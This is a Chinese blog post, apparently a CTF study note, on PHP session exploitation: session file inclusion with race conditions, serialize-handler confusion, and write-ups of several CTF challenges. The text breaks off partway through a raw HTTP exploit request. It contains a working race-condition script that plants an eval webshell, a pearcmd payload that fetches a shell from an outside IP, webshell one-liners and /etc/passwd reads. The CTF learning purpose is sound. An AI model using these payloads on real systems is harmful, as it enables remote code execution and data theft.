@@ -1,0 +1,557 @@
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>AmiaaaZ's Site | PHP_Session学习笔记</title>
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=generator content="Hugo 0.89.4">
+<meta name=ROBOTS content="INDEX, FOLLOW">
+<link href=/dist/app.css rel=stylesheet>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
+<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
+<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
+<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
+<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
+</head>
+<body class="bg-gray-100 text-gray-700 font-sans">
+<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
+<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
+<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
+<div>
+<h2>
+<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
+</h2>
+</div>
+<h1 class=pt-2>PHP_Session学习笔记</h1>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">十分常见的考点了捏，也有反序列化的身影</h3>
+<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
+<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
+&nbsp;&nbsp;
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/php>PHP</a>&nbsp;/
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/php_session>PHP_Session</a>&nbsp;/
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/unserialize>unserialize</a>
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-11-29T22:23:42+08:00>2021-11-29 22:23</time>
+</div>
+<details class=toc open>
+<summary>
+<hr>
+</summary>
+<div class="inline toc-content">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#session配置简述>session配置&简述</a></li>
+<li><a href=#文件包含条件竞争>文件包含&条件竞争</a>
+<ul>
+<li><a href=#wmctf2020make-php-great-again>[WMCTF2020]Make PHP Great Again</a></li>
+<li><a href=#hxb-2021easywill>[HXB 2021]easywill</a></li>
+</ul>
+</li>
+<li><a href=#反序列化>反序列化</a>
+<ul>
+<li><a href=#xctf-final-2018bestphp>[XCTF final 2018]bestphp</a></li>
+<li><a href=#lctf-2018bestphps-revenge>[LCTF 2018]bestphp&rsquo;s revenge</a></li>
+<li><a href=#jarvisoj-webphpinfo>[Jarvisoj web]PHPINFO</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</details>
+<hr>
+</div>
+</header>
+<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+<article>
+<section class="mx-auto content">
+<div class=c-rich-text><p>提到session，能想到什么捏？文件上传，条件竞争，session包含，反序列化…… 让我们一点点说</p>
+<hr>
+<h2 id=session配置简述>session配置&简述</h2>
+<p>以7.4.3为例，php.ini中关于Session有几个默认项</p>
+<ul>
+<li>
+<p><code>session.auto_start = 0</code>：默认不启动session，*但是可以在php脚本中手动执行<code>session_start()</code></p>
+</li>
+<li>
+<p><code>session.save_handler = files</code>：session以文件形式存储</p>
+</li>
+<li>
+<p><code>session.save_path=""</code>：session文件存储路径 文件名为<code>sess_PHPSESSID</code></p>
+<p>linux下默认存储位置；*可以被修改</p>
+<pre tabindex=0><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+
+/var/lib/php5/sess_PHPSESSID
+/var/lib/php5/sessions/sess_PHPSESSID
+
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+</code></pre></li>
+<li>
+<p><code>session.serialize_handler = php</code>：session的默认序列化引擎是php</p>
+<p>其实一共有3种，*php和php_serialize这两种是很多题的元凶</p>
+<table>
+<thead>
+<tr>
+<th>序列化引擎</th>
+<th>存储方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>php</td>
+<td>键名|序列化后字符串</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符（会有不可显示的字符）+键名+经过 serialize() 函数反序列处理的值</td>
+</tr>
+<tr>
+<td>php_serialize(php>=5.5.4)</td>
+<td>将字符串反序列化处理得到的数组</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p><code>session.upload_progress.enabled = On</code>：当有POST上传行为时，此次上传的详细信息（如上传时间、上传进度等）都会被存储到session中</p>
+</li>
+<li>
+<p><code>session.upload_progress.cleanup = On</code>：当POST上传完成后，此次的session文件内容会被立即情况</p>
+</li>
+<li>
+<p><code>session.upload_progress.prefix = "upload_progress_"</code>：存入session文件中的前缀部分</p>
+</li>
+<li>
+<p><code>session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"</code>：默认name，*可控可利用</p>
+</li>
+<li>
+<p><code>session.use_strict_mode = 0</code>：表示我们对Cookie中的PHPSESSID字段可控</p>
+</li>
+</ul>
+<h2 id=文件包含条件竞争>文件包含&条件竞争</h2>
+<p>默认情况下<code>session.use_strict_mode = 0</code>，当我们设置了Cookie的<code>PHPSESSID</code>字段后的值value后，php会自动创建session文件（默认路径<code>/tmp/sess_PHPSESSID</code>）；注意这个行为并不需要<code>session.auto_start = On</code>或是<code>session_start()</code>来手动开启就会被PHP自动初始化一个session，并将prefix+value写入sess_PHPSESSID文件中；整个流程中value可控，我们可以把恶意的payload加载到sess文件中然后包含，得到rce</p>
+<p>这是一个常见的上传表单</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>form</span> <span style=color:#75af00>action</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;index.php&#34;</span> <span style=color:#75af00>method</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;POST&#34;</span> <span style=color:#75af00>enctype</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;multipart/form-data&#34;</span><span style=color:#111>&gt;</span>
+    <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;hidden&#34;</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span style=color:#75af00>value</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;666666&#34;</span> <span style=color:#111>/&gt;</span>
+    <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;file&#34;</span> <span style=color:#75af00>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;file&#34;</span> <span style=color:#111>/&gt;</span>
+    <span style=color:#111>&lt;</span><span style=color:#f92672>input</span> <span style=color:#75af00>type</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;submit&#34;</span> <span style=color:#111>/&gt;</span>
+<span style=color:#111>&lt;/</span><span style=color:#f92672>form</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>当然一般的题不会有这么单纯，还会配一个默认项<code>session.upload_progress.cleanup = On</code>；但是如果我们构造上传表单时传的无用文件很大时就可以来个顶级拉扯（条件竞争），在它被清空前先包含&rce</p>
+<h3 id=wmctf2020make-php-great-again>[WMCTF2020]Make PHP Great Again</h3>
+<p>开幕源码暴击</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#75af00>highlight_file</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>);</span>
+<span style=color:#00a8c8>require_once</span> <span style=color:#d88200>&#39;flag.php&#39;</span><span style=color:#111>;</span>
+<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>isset</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;file&#39;</span><span style=color:#111>]))</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>require_once</span> <span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;file&#39;</span><span style=color:#111>];</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>这个题的非预期解：文件包含+条件竞争</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>io</span>
+<span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+<span style=color:#f92672>import</span> <span style=color:#111>threading</span>
+
+<span style=color:#111>sessid</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;AMIZ&#39;</span>
+<span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span><span style=color:#d88200>&#34;cmd&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;system(&#39;tac /var/www/html/flag.php&#39;);&#34;</span><span style=color:#111>}</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>write</span><span style=color:#111>(</span><span style=color:#111>session</span><span style=color:#111>):</span>
+    <span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
+        <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>io</span><span style=color:#f92672>.</span><span style=color:#111>BytesIO</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>100</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>50</span><span style=color:#111>)</span>
+        <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/&#39;</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span style=color:#111>:</span> <span style=color:#d88200>&#39;&lt;?php eval($_POST[&#34;cmd&#34;]);?&gt;&#39;</span><span style=color:#111>},</span> <span style=color:#111>files</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#39;file&#39;</span><span style=color:#111>:</span> <span style=color:#111>(</span><span style=color:#d88200>&#39;amiz.txt&#39;</span><span style=color:#111>,</span> <span style=color:#111>f</span><span style=color:#111>)},</span> <span style=color:#111>cookies</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#39;PHPSESSID&#39;</span><span style=color:#111>:</span> <span style=color:#111>sessid</span><span style=color:#111>})</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>read</span><span style=color:#111>(</span><span style=color:#111>session</span><span style=color:#111>):</span>
+    <span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
+        <span style=color:#111>resp</span> <span style=color:#f92672>=</span> <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_&#39;</span><span style=color:#f92672>+</span><span style=color:#111>sessid</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>data</span><span style=color:#111>)</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#d88200>&#39;amiz.txt&#39;</span> <span style=color:#f92672>in</span> <span style=color:#111>resp</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>:</span>
+            <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>resp</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
+            <span style=color:#111>event</span><span style=color:#f92672>.</span><span style=color:#111>clear</span><span style=color:#111>()</span>
+        <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
+            <span style=color:#00a8c8>pass</span>
+
+<span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
+    <span style=color:#111>event</span> <span style=color:#f92672>=</span> <span style=color:#111>threading</span><span style=color:#f92672>.</span><span style=color:#111>Event</span><span style=color:#111>()</span>
+    <span style=color:#00a8c8>with</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>session</span><span style=color:#111>()</span> <span style=color:#00a8c8>as</span> <span style=color:#111>session</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span> <span style=color:#ae81ff>30</span><span style=color:#111>):</span>
+            <span style=color:#111>threading</span><span style=color:#f92672>.</span><span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>write</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#f92672>=</span><span style=color:#111>(</span><span style=color:#111>session</span><span style=color:#111>,))</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
+
+        <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span> <span style=color:#ae81ff>30</span><span style=color:#111>):</span>
+            <span style=color:#111>threading</span><span style=color:#f92672>.</span><span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>read</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#f92672>=</span><span style=color:#111>(</span><span style=color:#111>session</span><span style=color:#111>,))</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
+    <span style=color:#111>event</span><span style=color:#f92672>.</span><span style=color:#111>set</span><span style=color:#111>()</span>
+
+</code></pre></div><h3 id=hxb-2021easywill>[HXB 2021]easywill</h3>
+<p>willphp v2.1.5，是基于tp的框架</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>namespace</span> <span style=color:#75af00>home\controller</span><span style=color:#111>;</span>
+<span style=color:#00a8c8>class</span> <span style=color:#75af00>IndexController</span><span style=color:#111>{</span>
+    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>index</span><span style=color:#111>(){</span>
+        <span style=color:#75af00>highlight_file</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>);</span>
+        <span style=color:#75af00>assign</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;name&#39;</span><span style=color:#111>],</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#39;value&#39;</span><span style=color:#111>]);</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#75af00>view</span><span style=color:#111>();</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>assign()可以控制name和value参数，而紧跟着的view函数有点东西</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png alt=image-20211118101839993></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png alt=image-20211118101952307></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png alt=image-20211118102033617></p>
+<p>可以看到最后的49行有文件写入的点，51行有个<code>extract()</code>可以做到变量覆盖，那我们就把file_put_contents的参数换成自己想要的</p>
+<pre tabindex=0><code>/?name=cfile&amp;value=/etc/passwd
+</code></pre><p>可以正常回显</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png alt=image-20211118102448850></p>
+<p>不过flag文件的名字并不是flag，我们可以用pearcmd写shell的方法来个webshell（详细的可以参考我之前写过的另一个题-><a href=https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day>[强网拟态 2021]Give_me_your_0day</a></p>
+<pre tabindex=0><code>/?name=cfile&amp;value=/../../../../usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php
+</code></pre><p>不过这里要注意shell的写法，常规的<code>&lt;?php eval($_POST['a']);?></code>这样的是不行的，下载就会报错</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png alt=image-20211118103659930></p>
+<p>执行也会报错，这里的shell要这样写</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span> <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#39;&lt;?php system(&#34;ls /&#34;);&#39;</span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png alt=image-20211118105922638></p>
+<p>之后直接把value的值换成flag文件名即可</p>
+<pre tabindex=0><code>/?name=cfile&amp;value=/flag32897328937298hdwidh
+</code></pre><p>————不过这里我直接写🐎一直成功不了，只能远程包含🐎</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png alt=image-20211118110226581></p>
+<p>————诶，说了半天，其实和本篇有关的在非预期的点，和上面的脚本几乎一样，要改的地方在于read部分的url了</p>
+<pre tabindex=0><code>?name=cfile&amp;value=/tmp/sess_'+sessid
+</code></pre><h2 id=反序列化>反序列化</h2>
+<p>这里详细的讲解可以参照<a href=https://blog.spoock.com/2016/10/16/php-serialize-problem/>PHP中SESSION反序列化机制</a>，就不做复制粘贴工程师了，用自己的话讲几个里面已经提过的点吧</p>
+<p>首先，这里的问题（我们可以攻击的原因）出现在两种序列化引擎混用的情况下，当提交</p>
+<pre tabindex=0><code>?a=|O:8:&quot;stdClass&quot;:0:{}
+</code></pre><p>时，<code>php_serialize</code>方式下会被存储为</p>
+<pre tabindex=0><code>a:1:{s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:{}&quot;;}
+</code></pre><p>但是被<code>php</code>方式则会解析为</p>
+<pre tabindex=0><code>a:1:{s:1:&quot;a&quot;;s:20:&quot;=O:8:&quot;stdClass&quot;:0:{}&quot;;}
+</code></pre><p>在具体应用时，可控的点除了get/post的参数之外，还可以接着构造文件上传的表单，除了<code>PHPSESSID</code>之外的废物文件的文件名就可以当此大任，记得序列化字符前面要加上<code>|</code>，内部的双引号要用<code>\</code>进行转义</p>
+<h3 id=xctf-final-2018bestphp>[XCTF final 2018]bestphp</h3>
+<p><a href=https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp>这里是docker环境</a>（注意设置暴露端口 另外首页的index.php的submit要改一下</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png alt=image-20211129171252486></p>
+<p>这里有熟悉的<code>call_user_func</code>，来读一下admin.php的源码</p>
+<pre tabindex=0><code>?function=extract&amp;file=php://filter/convert.base64-encode/resource=admin.php
+</code></pre><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#75af00>hello</span> <span style=color:#75af00>admin</span>
+<span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#00a8c8>empty</span><span style=color:#111>(</span><span style=color:#111>$_SESSION</span><span style=color:#111>[</span><span style=color:#d88200>&#39;name&#39;</span><span style=color:#111>])){</span>
+    <span style=color:#75af00>session_start</span><span style=color:#111>();</span>
+    <span style=color:#75715e>#echo &#39;hello &#39; + $_SESSION[&#39;name&#39;];
+</span><span style=color:#75715e></span><span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
+    <span style=color:#00a8c8>die</span><span style=color:#111>(</span><span style=color:#d88200>&#39;you must login with admin&#39;</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>再读一下function.php，但是好像这俩都没啥用</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#00a8c8>function</span> <span style=color:#75af00>filters</span><span style=color:#111>(</span><span style=color:#111>$data</span><span style=color:#111>){</span>
+    <span style=color:#00a8c8>foreach</span><span style=color:#111>(</span><span style=color:#111>$data</span> <span style=color:#00a8c8>as</span> <span style=color:#111>$key</span><span style=color:#f92672>=&gt;</span><span style=color:#111>$value</span><span style=color:#111>){</span>
+        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>preg_match</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/eval|assert|exec|passthru|glob|system|popen/i&#39;</span><span style=color:#111>,</span><span style=color:#111>$value</span><span style=color:#111>)){</span>
+            <span style=color:#00a8c8>die</span><span style=color:#111>(</span><span style=color:#d88200>&#39;Do not hack me!&#39;</span><span style=color:#111>);</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>很显然我们需要利用session包含，但是index.php中设置了open_basedir，默认的session路径是<code>/var/lib/php/sessions/sess_phpsessid</code>，不过有个方式可以更改session存储目录</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png alt=image-20211129172602323></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png alt=image-20211129172609578></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png alt=image-20211129172619585></p>
+<p>那我们就可以把shell写到web根目录下</p>
+<pre tabindex=0><code>?function=session_start&amp;save_path=.
+POST: name=&lt;?php echo &quot;aaa&quot;;system($_GET[x]);?&gt;
+</code></pre><p>一般的一句话会没法正常工作（之前湖湘杯willphp也是这样，那个是<code>&lt;?php echo '&lt;?php system("ls /");'?></code></p>
+<pre tabindex=0><code>?function=extract&amp;file=/var/www/html/sess_qwer&amp;x=ls
+?function=extract&amp;file=/var/www/html/sess_qwer&amp;x=cat+fsadgsdagsadgasd.php
+</code></pre><p>拿到flag</p>
+<h4 id=解法2php70---lfi-via-segmentfault>解法2：php7.0 - LFI via SegmentFault</h4>
+<p>参考：<a href=https://www.jianshu.com/p/dfd049924258>LFI via SegmentFault</a></p>
+<pre tabindex=0><code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
+</code></pre><p><code>string.strip_tags</code>可以导致php在执行过程中Segment Fault</p>
+<p>如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）</p>
+<p>利用exp（打出来502是正常情况</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#75af00>POST</span> <span style=color:#111>/index.php?function=extract&amp;file=php://filter/string.strip_tags/resource=function.php</span> <span style=color:#00a8c8>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
+<span style=color:#111>Host</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>101.35.114.107:20004</span>
+<span style=color:#111>Content-Length</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1701</span>
+<span style=color:#111>Cache-Control</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>max-age=0</span>
+<span style=color:#111>Origin</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>null</span>
+<span style=color:#111>Upgrade-Insecure-Requests</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>
+<span style=color:#111>DNT</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>
+<span style=color:#111>Content-Type</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk</span>
+<span style=color:#111>User-Agent</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span>
+<span style=color:#111>Accept</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span>
+<span style=color:#111>Accept-Encoding</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>gzip, deflate</span>
+<span style=color:#111>Accept-Language</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
+<span style=color:#111>Cookie</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>PHPSESSID=17qpuv1r8g19pm503593nddq10</span>
+<span style=color:#111>Connection</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
+
+------WebKitFormBoundaryeScXqSzdW2v22xyk
+Content-Disposition: form-data; name=&#34;fileUpload&#34;; filename=&#34;test.jpg&#34;
+Content-Type: image/jpeg
+
